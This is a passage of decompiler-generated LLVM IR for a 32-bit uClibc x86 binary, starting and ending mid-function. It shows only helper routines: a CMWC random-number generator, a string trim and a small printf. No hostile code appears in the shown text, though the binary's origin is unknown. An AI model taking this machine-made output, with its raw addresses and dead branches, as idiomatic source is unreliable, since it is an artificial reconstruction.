  br i1 %v1_804814f, label %dec_label_pc_8048165, label %dec_label_pc_8048153

dec_label_pc_8048153:                             ; preds = %dec_label_pc_804814a
  br label %dec_label_pc_8048165

dec_label_pc_8048165:                             ; preds = %dec_label_pc_8048153, %dec_label_pc_804814a
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804814a, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @ebp, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_8048170 = load i32, i32* @eax, align 4
  store i32 %v0_8048170, i32* %stack_var_-4, align 4
  %v4_8048170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048172 = load i32, i32* @edx, align 4
  %v9_8048184 = call i32 @__uClibc_main(i32 134547058, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134578340, i32 %v0_8048172, i32 %v4_8048170, i32 %v0_8048170)
  ret i32 %v9_8048184

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_805c540.7, align 64
  %v1_804819d = add i32 %arg1, -1640531527
  store i32 %v1_804819d, i32* @global_var_805c544.8, align 4
  %v1_80481aa = add i32 %arg1, 1013904242
  store i32 %v1_80481aa, i32* %eax.global-to-local, align 4
  store i32 %v1_80481aa, i32* @global_var_805c548.9, align 8
  br label %dec_label_pc_80481bd

dec_label_pc_80481bd:                             ; preds = %entry, %dec_label_pc_80481bd
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_80481ed, %dec_label_pc_80481bd ]
  %v1_80481c3 = add nsw i32 %storemerge5, -3
  store i32 %v1_80481c3, i32* %eax.global-to-local, align 4
  %v1_80481c6 = mul nuw nsw i32 %v1_80481c3, 4
  %v2_80481c6 = add i32 %v1_80481c6, ptrtoint (i32* @global_var_805c540.7 to i32)
  %v3_80481c6 = inttoptr i32 %v2_80481c6 to i32*
  %v4_80481c6 = load i32, i32* %v3_80481c6, align 4
  %v1_80481d0 = add nsw i32 %storemerge5, -2
  store i32 %v1_80481d0, i32* %eax.global-to-local, align 4
  %v1_80481d3 = mul nuw nsw i32 %v1_80481d0, 4
  %v2_80481d3 = add i32 %v1_80481d3, ptrtoint (i32* @global_var_805c540.7 to i32)
  %v3_80481d3 = inttoptr i32 %v2_80481d3 to i32*
  %v4_80481d3 = load i32, i32* %v3_80481d3, align 4
  %v2_80481da = xor i32 %v4_80481d3, %v4_80481c6
  %v2_80481df = xor i32 %storemerge5, -1640531527
  %v1_80481e1 = xor i32 %v2_80481df, %v2_80481da
  store i32 %v1_80481e1, i32* %eax.global-to-local, align 4
  %v2_80481e6 = mul nuw nsw i32 %storemerge5, 4
  %v3_80481e6 = add i32 %v2_80481e6, ptrtoint (i32* @global_var_805c540.7 to i32)
  %v4_80481e6 = inttoptr i32 %v3_80481e6 to i32*
  store i32 %v1_80481e1, i32* %v4_80481e6, align 4
  %v4_80481ed = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_80481ed, 4096
  br i1 %exitcond, label %dec_label_pc_80481f9, label %dec_label_pc_80481bd

dec_label_pc_80481f9:                             ; preds = %dec_label_pc_80481bd
  %v0_80481fa = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80481fa

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80481bd, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048217 = load i32, i32* @global_var_805c270.10, align 16
  %v1_804821c = add i32 %v0_8048217, 1
  %v1_804821d = urem i32 %v1_804821c, 4096
  store i32 %v1_804821d, i32* @global_var_805c270.10, align 16
  %v1_804822c = mul nuw nsw i32 %v1_804821d, 4
  %v2_804822c = add i32 %v1_804822c, ptrtoint (i32* @global_var_805c540.7 to i32)
  %v3_804822c = inttoptr i32 %v2_804822c to i32*
  %v4_804822c = load i32, i32* %v3_804822c, align 4
  %v7_8048249 = udiv i32 %v4_804822c, 228675
  store i32 %v7_8048249, i32* @global_var_805c26c.11, align 4
  br i1 true, label %dec_label_pc_8048299, label %dec_label_pc_804828b

dec_label_pc_804828b:                             ; preds = %entry
  br label %dec_label_pc_8048299

dec_label_pc_8048299:                             ; preds = %entry, %dec_label_pc_804828b
  %v1_80482ae = mul nuw nsw i32 %v1_804821d, 4
  %v2_80482ae = add i32 %v1_80482ae, ptrtoint (i32* @global_var_805c540.7 to i32)
  %v3_80482ae = inttoptr i32 %v2_80482ae to i32*
  %v4_80482ae = load i32, i32* %v3_80482ae, align 4
  ret i32 %v4_80482ae

; uselistorder directives
  uselistorder i32 %v1_804821d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048299, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_80482be = load i32, i32* @edi, align 4
  store i32 %v0_80482be, i32* %stack_var_-8, align 4
  %v4_80482c9 = ptrtoint i8* %arg1 to i32
  store i1 false, i1* @df, align 1
  %v3_80482da = call i32 @_strlen(i8* %arg1)
  %v1_80482e1 = add i32 %v3_80482da, -1
  br label %dec_label_pc_80482ea

dec_label_pc_80482e7:                             ; preds = %dec_label_pc_80482ea
  %v4_80482e7 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_80482ea

dec_label_pc_80482ea:                             ; preds = %entry, %dec_label_pc_80482e7
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_80482e7, %dec_label_pc_80482e7 ]
  %v6_80482ed = add i32 %stack_var_-16.0, %v4_80482c9
  %v1_80482f0 = inttoptr i32 %v6_80482ed to i8*
  %v2_80482f0 = load i8, i8* %v1_80482f0, align 1
  %v2_80482f3 = sext i8 %v2_80482f0 to i32
  %v1_80482f9 = call i32 @isspace(i32 %v2_80482f3)
  %v1_80482fe = icmp eq i32 %v1_80482f9, 0
  %v1_8048300 = icmp eq i1 %v1_80482fe, false
  br i1 %v1_8048300, label %dec_label_pc_80482e7, label %dec_label_pc_8048307.preheader

dec_label_pc_8048307.preheader:                   ; preds = %dec_label_pc_80482ea
  %v5_804830d17 = icmp slt i32 %v1_80482e1, %stack_var_-16.0
  br i1 %v5_804830d17, label %dec_label_pc_8048327, label %dec_label_pc_804830f

dec_label_pc_8048304:                             ; preds = %dec_label_pc_804830f
  %v4_8048304 = add i32 %stack_var_-12.018, -1
  %v5_804830d = icmp slt i32 %v4_8048304, %stack_var_-16.0
  br i1 %v5_804830d, label %dec_label_pc_8048327, label %dec_label_pc_804830f

dec_label_pc_804830f:                             ; preds = %dec_label_pc_8048307.preheader, %dec_label_pc_8048304
  %stack_var_-12.018 = phi i32 [ %v4_8048304, %dec_label_pc_8048304 ], [ %v1_80482e1, %dec_label_pc_8048307.preheader ]
  %v6_8048312 = add i32 %stack_var_-12.018, %v4_80482c9
  %v1_8048315 = inttoptr i32 %v6_8048312 to i8*
  %v2_8048315 = load i8, i8* %v1_8048315, align 1
  %v2_8048318 = sext i8 %v2_8048315 to i32
  %v1_804831e = call i32 @isspace(i32 %v2_8048318)
  %v1_8048323 = icmp eq i32 %v1_804831e, 0
  %v1_8048325 = icmp eq i1 %v1_8048323, false
  br i1 %v1_8048325, label %dec_label_pc_8048304, label %dec_label_pc_8048327

dec_label_pc_8048327:                             ; preds = %dec_label_pc_8048304, %dec_label_pc_804830f, %dec_label_pc_8048307.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %v1_80482e1, %dec_label_pc_8048307.preheader ], [ %stack_var_-12.018, %dec_label_pc_804830f ], [ %v4_8048304, %dec_label_pc_8048304 ]
  br label %dec_label_pc_804834a

dec_label_pc_804832f:                             ; preds = %dec_label_pc_804834a
  %v6_804833f = add i32 %storemerge, %v4_80482c9
  %v1_8048342 = inttoptr i32 %v6_804833f to i8*
  %v2_8048342 = load i8, i8* %v1_8048342, align 1
  %v3_8048345 = inttoptr i32 %v6_804835a to i8*
  store i8 %v2_8048342, i8* %v3_8048345, align 1
  %v4_8048347 = add i32 %storemerge, 1
  br label %dec_label_pc_804834a

dec_label_pc_804834a:                             ; preds = %dec_label_pc_8048327, %dec_label_pc_804832f
  %storemerge = phi i32 [ %v4_8048347, %dec_label_pc_804832f ], [ %stack_var_-16.0, %dec_label_pc_8048327 ]
  %v7_8048350 = icmp sgt i32 %storemerge, %stack_var_-12.0.lcssa
  %v2_8048358 = sub i32 %storemerge, %stack_var_-16.0
  %v6_804835a = add i32 %v2_8048358, %v4_80482c9
  br i1 %v7_8048350, label %dec_label_pc_8048352, label %dec_label_pc_804832f

dec_label_pc_8048352:                             ; preds = %dec_label_pc_804834a
  %v22_804835a = inttoptr i32 %v6_804835a to i8*
  store i8 0, i8* %v22_804835a, align 1
  %v2_8048363 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048363, i32* @edi, align 4
  ret i32 %v6_804835a

; uselistorder directives
  uselistorder i32 %storemerge, { 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-12.018, { 0, 2, 1 }
  uselistorder i32 %v1_80482e1, { 2, 1, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804834a, { 1, 0 }
  uselistorder label %dec_label_pc_8048327, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804830f, { 1, 0 }
  uselistorder label %dec_label_pc_80482ea, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804836c = icmp eq i32* %arg1, null
  br i1 %v4_804836c, label %dec_label_pc_804838b, label %dec_label_pc_8048372

dec_label_pc_8048372:                             ; preds = %entry
  %tmp5 = ptrtoint i32* %arg1 to i32
  %v2_8048375 = load i32, i32* %arg1, align 4
  %v3_804837a = inttoptr i32 %v2_8048375 to i8*
  store i8 %tmp8, i8* %v3_804837a, align 1
  %v2_804837f = load i32, i32* %arg1, align 4
  %v1_8048381 = add i32 %v2_804837f, 1
  store i32 %v1_8048381, i32* @edx, align 4
  store i32 %v1_8048381, i32* %arg1, align 4
  br label %dec_label_pc_80483a6

dec_label_pc_804838b:                             ; preds = %entry
  %v3_80483a1 = bitcast i8* %stack_var_8 to i32*
  %v4_80483a1 = call i32 @__libc_write(i32 1, i32* %v3_80483a1, i32 1)
  br label %dec_label_pc_80483a6

dec_label_pc_80483a6:                             ; preds = %dec_label_pc_8048372, %dec_label_pc_804838b
  %v0_80483a7 = phi i32 [ %tmp5, %dec_label_pc_8048372 ], [ %v4_80483a1, %dec_label_pc_804838b ]
  ret i32 %v0_80483a7

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_80483a6, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp13 = icmp slt i32 %arg3, 1
  br i1 %tmp13, label %dec_label_pc_8048409, label %dec_label_pc_80483c2

dec_label_pc_80483c2:                             ; preds = %entry
  %v4_80483c9 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80483c9, i32* @edx, align 4
  %v2_80483da45 = load i8, i8* %arg2, align 1
  %v4_80483dd47 = icmp eq i8 %v2_80483da45, 0
  %v1_80483df49 = icmp eq i1 %v4_80483dd47, false
  br i1 %v1_80483df49, label %dec_label_pc_80483d1, label %dec_label_pc_80483e1

dec_label_pc_80483d1:                             ; preds = %dec_label_pc_80483c2, %dec_label_pc_80483d1
  %v4_80483d751 = phi i32 [ %v5_80483d4, %dec_label_pc_80483d1 ], [ %v4_80483c9, %dec_label_pc_80483c2 ]
  %stack_var_-12.050 = phi i32 [ %v4_80483d1, %dec_label_pc_80483d1 ], [ 0, %dec_label_pc_80483c2 ]
  %v4_80483d1 = add i32 %stack_var_-12.050, 1
  %v5_80483d4 = add i32 %v4_80483d751, 1
  %v22_80483d4 = inttoptr i32 %v5_80483d4 to i8*
  store i32 %v5_80483d4, i32* @edx, align 4
  %v2_80483da = load i8, i8* %v22_80483d4, align 1
  %v4_80483dd = icmp eq i8 %v2_80483da, 0
  %v1_80483df = icmp eq i1 %v4_80483dd, false
  br i1 %v1_80483df, label %dec_label_pc_80483d1, label %dec_label_pc_80483e1

dec_label_pc_80483e1:                             ; preds = %dec_label_pc_80483d1, %dec_label_pc_80483c2
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_80483c2 ], [ %v4_80483d1, %dec_label_pc_80483d1 ]
  %v5_80483e7 = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_80483e7, label %dec_label_pc_80483f2, label %dec_label_pc_80483f8

dec_label_pc_80483f2:                             ; preds = %dec_label_pc_80483e1
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_80483f5 = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_80483f8

dec_label_pc_80483f8:                             ; preds = %dec_label_pc_80483e1, %dec_label_pc_80483f2
  %storemerge = phi i32 [ %v5_80483f5, %dec_label_pc_80483f2 ], [ 0, %dec_label_pc_80483e1 ]
  %v1_80483fb = and i32 %arg4, 2
  %tmp14 = mul nuw nsw i32 %v1_80483fb, 8
  %tmp15 = or i32 %tmp14, 32
  br label %dec_label_pc_8048409

dec_label_pc_8048409:                             ; preds = %dec_label_pc_80483f8, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_80483f8 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp15, %dec_label_pc_80483f8 ]
  %v1_804840c = urem i32 %arg4, 2
  %v2_804840c = icmp eq i32 %v1_804840c, 0
  %v1_8048411 = icmp eq i1 %v2_804840c, false
  %.pre = inttoptr i32 %arg1 to i32*
  br i1 %v1_8048411, label %dec_label_pc_8048453.preheader, label %dec_label_pc_804842d.preheader

dec_label_pc_804842d.preheader:                   ; preds = %dec_label_pc_8048409
  %tmp1638 = icmp slt i32 %stack_var_12.0, 1
  %tmp1739 = icmp eq i1 %tmp1638, false
  br i1 %tmp1739, label %dec_label_pc_8048415, label %dec_label_pc_8048453.preheader

dec_label_pc_8048415:                             ; preds = %dec_label_pc_804842d.preheader, %dec_label_pc_8048415
  %stack_var_-20.041 = phi i32 [ %v4_8048427, %dec_label_pc_8048415 ], [ 0, %dec_label_pc_804842d.preheader ]
  %stack_var_12.140 = phi i32 [ %v4_804842a, %dec_label_pc_8048415 ], [ %stack_var_12.0, %dec_label_pc_804842d.preheader ]
  %v3_8048422 = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_8048427 = add i32 %stack_var_-20.041, 1
  %v4_804842a = add i32 %stack_var_12.140, -1
  %tmp16 = icmp slt i32 %v4_804842a, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_8048415, label %dec_label_pc_8048453.preheader

dec_label_pc_8048453.preheader:                   ; preds = %dec_label_pc_804842d.preheader, %dec_label_pc_8048415, %dec_label_pc_8048409
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_8048409 ], [ %stack_var_12.0, %dec_label_pc_804842d.preheader ], [ %v4_804842a, %dec_label_pc_8048415 ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_8048409 ], [ 0, %dec_label_pc_804842d.preheader ], [ %v4_8048427, %dec_label_pc_8048415 ]
  %v4_804845326 = ptrtoint i8* %arg2 to i32
  %v2_804845627 = load i8, i8* %arg2, align 1
  %v4_804845929 = icmp eq i8 %v2_804845627, 0
  %v1_804845b31 = icmp eq i1 %v4_804845929, false
  br i1 %v1_804845b31, label %dec_label_pc_8048435, label %dec_label_pc_8048477.preheader

dec_label_pc_8048435:                             ; preds = %dec_label_pc_8048453.preheader, %dec_label_pc_8048435
  %v4_804845334 = phi i32 [ %v5_8048450, %dec_label_pc_8048435 ], [ %v4_804845326, %dec_label_pc_8048453.preheader ]
  %stack_var_-20.133 = phi i32 [ %v4_804844d, %dec_label_pc_8048435 ], [ %stack_var_-20.1.ph, %dec_label_pc_8048453.preheader ]
  %stack_var_8.032 = phi i8* [ %v22_8048450, %dec_label_pc_8048435 ], [ %arg2, %dec_label_pc_8048453.preheader ]
  %v2_8048438 = load i8, i8* %stack_var_8.032, align 1
  %v3_8048438 = zext i8 %v2_8048438 to i32
  %v3_8048448 = call i32 @printchar(i32* %.pre, i32 %v3_8048438)
  %v4_804844d = add i32 %stack_var_-20.133, 1
  %v5_8048450 = add i32 %v4_804845334, 1
  %v22_8048450 = inttoptr i32 %v5_8048450 to i8*
  %v2_8048456 = load i8, i8* %v22_8048450, align 1
  %v4_8048459 = icmp eq i8 %v2_8048456, 0
  %v1_804845b = icmp eq i1 %v4_8048459, false
  br i1 %v1_804845b, label %dec_label_pc_8048435, label %dec_label_pc_8048477.preheader

dec_label_pc_8048477.preheader:                   ; preds = %dec_label_pc_8048435, %dec_label_pc_8048453.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_8048453.preheader ], [ %v4_804844d, %dec_label_pc_8048435 ]
  %tmp1822 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp1923 = icmp eq i1 %tmp1822, false
  br i1 %tmp1923, label %dec_label_pc_804845f, label %dec_label_pc_804847d

dec_label_pc_804845f:                             ; preds = %dec_label_pc_8048477.preheader, %dec_label_pc_804845f
  %stack_var_-20.225 = phi i32 [ %v4_8048471, %dec_label_pc_804845f ], [ %stack_var_-20.1.lcssa, %dec_label_pc_8048477.preheader ]
  %stack_var_12.324 = phi i32 [ %v4_8048474, %dec_label_pc_804845f ], [ %stack_var_12.2.ph, %dec_label_pc_8048477.preheader ]
  %v3_804846c = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_8048471 = add i32 %stack_var_-20.225, 1
  %v4_8048474 = add i32 %stack_var_12.324, -1
  %tmp18 = icmp slt i32 %v4_8048474, 1
  %tmp19 = icmp eq i1 %tmp18, false
  br i1 %tmp19, label %dec_label_pc_804845f, label %dec_label_pc_804847d

dec_label_pc_804847d:                             ; preds = %dec_label_pc_804845f, %dec_label_pc_8048477.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048477.preheader ], [ %v4_8048471, %dec_label_pc_804845f ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048474, { 1, 0 }
  uselistorder i8* %v22_8048450, { 1, 0 }
  uselistorder i32 %v5_8048450, { 1, 0 }
  uselistorder i32 %v4_804842a, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_80483d4, { 1, 2, 0 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_804845f, { 1, 0 }
  uselistorder label %dec_label_pc_8048435, { 1, 0 }
  uselistorder label %dec_label_pc_8048453.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048415, { 1, 0 }
  uselistorder label %dec_label_pc_80483f8, { 1, 0 }
  uselistorder label %dec_label_pc_80483d1, { 1, 0 }
}

define i32 @printi(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v4_8048496 = trunc i64 %arg2 to i32
  %v5_804849c = icmp eq i32 %v4_8048496, 0
  %v6_804849c = icmp slt i32 %v4_8048496, 0
  %v1_80484a0 = icmp eq i1 %v5_804849c, false
  br i1 %v1_80484a0, label %dec_label_pc_80484d2, label %dec_label_pc_80484a2

dec_label_pc_80484a2:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp41 = bitcast i32* %stack_var_-16 to i8*
  %v6_80484c5 = call i32 @prints(i32 %arg1, i8* %tmp41, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_80485bc

dec_label_pc_80484d2:                             ; preds = %entry
  %v4_80484d2 = icmp eq i32 %arg4, 0
  br i1 %v4_80484d2, label %dec_label_pc_80484f3, label %dec_label_pc_80484d8

dec_label_pc_80484d8:                             ; preds = %dec_label_pc_80484d2
  %v13_80484d8 = icmp eq i32 %arg3, 10
  %v1_80484dc = icmp eq i1 %v13_80484d8, false
  br i1 %v1_80484dc, label %dec_label_pc_80484f3, label %dec_label_pc_80484de

dec_label_pc_80484de:                             ; preds = %dec_label_pc_80484d8
  %v1_80484e2 = icmp eq i1 %v6_804849c, false
  br i1 %v1_80484e2, label %dec_label_pc_80484f3, label %dec_label_pc_80484e4

dec_label_pc_80484e4:                             ; preds = %dec_label_pc_80484de
  %v1_80484ee = sub i32 0, %v4_8048496
  %v5_80484f0 = sext i32 %v1_80484ee to i64
  br label %dec_label_pc_80484f3

dec_label_pc_80484f3:                             ; preds = %dec_label_pc_80484de, %dec_label_pc_80484d8, %dec_label_pc_80484d2, %dec_label_pc_80484e4
  %stack_var_-24.0 = phi i64 [ %arg2, %dec_label_pc_80484d2 ], [ %arg2, %dec_label_pc_80484d8 ], [ %arg2, %dec_label_pc_80484de ], [ %v5_80484f0, %dec_label_pc_80484e4 ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_80484d2 ], [ 0, %dec_label_pc_80484d8 ], [ 0, %dec_label_pc_80484de ], [ 1, %dec_label_pc_80484e4 ]
  %tmp42 = bitcast i32* %stack_var_-5 to i8*
  store i8 0, i8* %tmp42, align 4
  %v4_80485547 = trunc i64 %stack_var_-24.0 to i32
  %v5_80485548 = icmp eq i32 %v4_80485547, 0
  %v1_804855815 = icmp eq i1 %v5_80485548, false
  br i1 %v1_804855815, label %dec_label_pc_8048504.lr.ph, label %dec_label_pc_804855a

dec_label_pc_8048504.lr.ph:                       ; preds = %dec_label_pc_80484f3
  %v5_8048507 = sext i32 %arg3 to i64
  br label %dec_label_pc_8048504

dec_label_pc_8048504:                             ; preds = %dec_label_pc_8048504.lr.ph, %dec_label_pc_804852c
  %stack_var_-24.117 = phi i64 [ %stack_var_-24.0, %dec_label_pc_8048504.lr.ph ], [ %v5_8048551, %dec_label_pc_804852c ]
  %stack_var_-40.016 = phi i8* [ %tmp42, %dec_label_pc_8048504.lr.ph ], [ %v22_804852c, %dec_label_pc_804852c ]
  %v6_8048512 = and i64 %stack_var_-24.117, 4294967295
  %v12_8048512 = udiv i64 %v6_8048512, %v5_8048507
  %v13_8048512 = trunc i64 %v12_8048512 to i32
  %v14_8048512 = urem i64 %v6_8048512, %v5_8048507
  %v5_8048517 = trunc i64 %v14_8048512 to i8
  %v7_804851e = icmp sgt i8 %v5_8048517, 9
  br i1 %v7_804851e, label %dec_label_pc_8048520, label %dec_label_pc_804852c

dec_label_pc_8048520:                             ; preds = %dec_label_pc_8048504
  %tmp = trunc i64 %v14_8048512 to i32
  %v5_8048523 = add i32 %tmp, %arg7
  %v1_8048526 = add i32 %v5_8048523, 198
  %v11_8048526 = trunc i32 %v1_8048526 to i8
  br label %dec_label_pc_804852c

dec_label_pc_804852c:                             ; preds = %dec_label_pc_8048504, %dec_label_pc_8048520
  %stack_var_-36.0 = phi i8 [ %v11_8048526, %dec_label_pc_8048520 ], [ %v5_8048517, %dec_label_pc_8048504 ]
  %v4_804852c = ptrtoint i8* %stack_var_-40.016 to i32
  %v5_804852c = add i32 %v4_804852c, -1
  %v22_804852c = inttoptr i32 %v5_804852c to i8*
  %v2_8048533 = add i8 %stack_var_-36.0, 48
  store i8 %v2_8048533, i8* %v22_804852c, align 1
  %v5_8048551 = sext i32 %v13_8048512 to i64
  %v5_8048554 = icmp eq i32 %v13_8048512, 0
  %v1_8048558 = icmp eq i1 %v5_8048554, false
  br i1 %v1_8048558, label %dec_label_pc_8048504, label %dec_label_pc_804855a

dec_label_pc_804855a:                             ; preds = %dec_label_pc_804852c, %dec_label_pc_80484f3
  %stack_var_-40.0.lcssa = phi i8* [ %tmp42, %dec_label_pc_80484f3 ], [ %v22_804852c, %dec_label_pc_804852c ]
  %v4_804855a = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_804855a, label %dec_label_pc_8048594, label %dec_label_pc_8048560

dec_label_pc_8048560:                             ; preds = %dec_label_pc_804855a
  %v4_8048560 = icmp eq i32 %arg5, 0
  br i1 %v4_8048560, label %dec_label_pc_804858b, label %dec_label_pc_8048566

dec_label_pc_8048566:                             ; preds = %dec_label_pc_8048560
  %v1_8048569 = and i32 %arg6, 2
  %v2_8048569 = icmp eq i32 %v1_8048569, 0
  br i1 %v2_8048569, label %dec_label_pc_804858b, label %dec_label_pc_8048570

dec_label_pc_8048570:                             ; preds = %dec_label_pc_8048566
  %v3_804857e = inttoptr i32 %arg1 to i32*
  %v4_804857e = call i32 @printchar(i32* %v3_804857e, i32 45)
  %v4_8048586 = add i32 %arg5, -1
  br label %dec_label_pc_8048594

dec_label_pc_804858b:                             ; preds = %dec_label_pc_8048566, %dec_label_pc_8048560
  %v4_804858b = ptrtoint i8* %stack_var_-40.0.lcssa to i32
  %v5_804858b = add i32 %v4_804858b, -1
  %v22_804858b = inttoptr i32 %v5_804858b to i8*
  store i8 45, i8* %v22_804858b, align 1
  br label %dec_label_pc_8048594

dec_label_pc_8048594:                             ; preds = %dec_label_pc_804855a, %dec_label_pc_8048570, %dec_label_pc_804858b
  %stack_var_20.0 = phi i32 [ %arg5, %dec_label_pc_804855a ], [ %arg5, %dec_label_pc_804858b ], [ %v4_8048586, %dec_label_pc_8048570 ]
  %stack_var_-40.1 = phi i8* [ %stack_var_-40.0.lcssa, %dec_label_pc_804855a ], [ %v22_804858b, %dec_label_pc_804858b ], [ %stack_var_-40.0.lcssa, %dec_label_pc_8048570 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_804855a ], [ 0, %dec_label_pc_804858b ], [ 1, %dec_label_pc_8048570 ]
  %v6_80485af = call i32 @prints(i32 %arg1, i8* %stack_var_-40.1, i32 %stack_var_20.0, i32 %arg6)
  %v2_80485b7 = add i32 %v6_80485af, %stack_var_-28.0
  store i32 %v2_80485b7, i32* @edx, align 4
  br label %dec_label_pc_80485bc

dec_label_pc_80485bc:                             ; preds = %dec_label_pc_80484a2, %dec_label_pc_8048594
  %storemerge = phi i32 [ %v2_80485b7, %dec_label_pc_8048594 ], [ %v6_80484c5, %dec_label_pc_80484a2 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-40.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v22_804852c, { 0, 2, 1 }
  uselistorder i8 %v5_8048517, { 1, 0 }
  uselistorder i64 %v6_8048512, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg5, { 2, 4, 1, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i64 %arg2, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80485bc, { 1, 0 }
  uselistorder label %dec_label_pc_8048594, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804852c, { 1, 0 }
  uselistorder label %dec_label_pc_8048504, { 1, 0 }
  uselistorder label %dec_label_pc_80484f3, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80485c1 = load i32, i32* @ebp, align 4
  store i32 %v0_80485c1, i32* %stack_var_-4, align 4
  %tmp21 = bitcast i32* %stack_var_-6 to i8*
  %stack_var_8.435 = inttoptr i32 %arg2 to i8*
  %v2_804887536 = load i8, i8* %stack_var_8.435, align 1
  %v4_804887838 = icmp eq i8 %v2_804887536, 0
  %v1_804887a40 = icmp eq i1 %v4_804887838, false
  br i1 %v1_804887a40, label %dec_label_pc_80485d3, label %dec_label_pc_8048880

dec_label_pc_80485d3:                             ; preds = %entry, %dec_label_pc_804886f
  %stack_var_8.444 = phi i8* [ %stack_var_8.4, %dec_label_pc_804886f ], [ %stack_var_8.435, %entry ]
  %stack_var_-28.143 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804886f ], [ 0, %entry ]
  %stack_var_12.142 = phi i32 [ %stack_var_12.0, %dec_label_pc_804886f ], [ %arg3, %entry ]
  %stack_var_8.4.in41 = phi i32 [ %v5_804886f, %dec_label_pc_804886f ], [ %arg2, %entry ]
  %v2_80485d6 = load i8, i8* %stack_var_8.444, align 1
  %v10_80485d9 = icmp eq i8 %v2_80485d6, 37
  %v1_80485db = icmp eq i1 %v10_80485d9, false
  br i1 %v1_80485db, label %dec_label_pc_8048854, label %dec_label_pc_80485e1

dec_label_pc_80485e1:                             ; preds = %dec_label_pc_80485d3
  %v5_80485e1 = add i32 %stack_var_8.4.in41, 1
  %v22_80485e1 = inttoptr i32 %v5_80485e1 to i8*
  %v2_80485f4 = load i8, i8* %v22_80485e1, align 1
  %v4_80485f7 = icmp eq i8 %v2_80485f4, 0
  br i1 %v4_80485f7, label %dec_label_pc_8048880, label %dec_label_pc_80485ff

